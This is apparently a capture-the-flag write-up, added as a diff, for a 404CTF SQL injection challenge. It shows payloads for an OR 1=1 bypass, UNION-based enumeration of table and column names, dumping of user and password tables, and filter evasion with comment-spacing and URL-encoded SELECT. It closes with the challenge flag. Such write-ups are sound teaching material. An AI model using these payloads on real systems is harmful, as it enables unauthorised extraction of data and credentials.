@@ -1,0 +1,52 @@
+# Le Braquage : Basic SQL Injection
+
+## Part 1 : Or
+
+By trial and error, we find that the character used to comment out is # and ' is used as quotes :
+
+```
+Request :
+' OR 1=1 #
+```
+
+## Part 2 : Union
+
+First we need to find out what's the name of the table we are trying to get to.
+
+```
+Request
+' OR 1=1 UNION SELECT table_name,1 FROM information_schema.tables#
+```
+
+Then we need to find out what's the name of the column.
+
+```
+Request for info : 
+' OR 1=1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='Users'#
+```
+
+And with the info that we've gathered we retrieve parts of our flag.
+
+```
+Request to retrieve part of the flag : 
+' OR 1=1 UNION SELECT nom,prenom FROM Users #
+```
+## Part 3 : Bypassing filters
+
+This time we do the same but spaces and the word SELECT are filtered out so we just used the trick of using comments to replace the spaces /**/ and encode the word SELECT which gives us %53%45%4c%45%43%54. Then we repeat the same steps as before. 
+
+First we need to find out what's the name of the table we are trying to get to.
+
+```
+Request for info :
+'/**/OR/**/1=1/**/UNION/**/%53%45%4c%45%43%54/**/table_name,1,1/**/FROM/**/information_schema.tables#
+
+
+Request for info :
+'/**/OR/**/1=1/**/UNION/**/%53%45%4c%45%43%54/**/column_name,1,1/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='Password'#
+
+Request to retrieve the last parts of the flag : 
+'/**/OR/**/1=1/**/UNION/**/%53%45%4c%45%43%54/**/id,mdp,3/**/FROM/**/Password#
+```
+
+Flag : 404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}
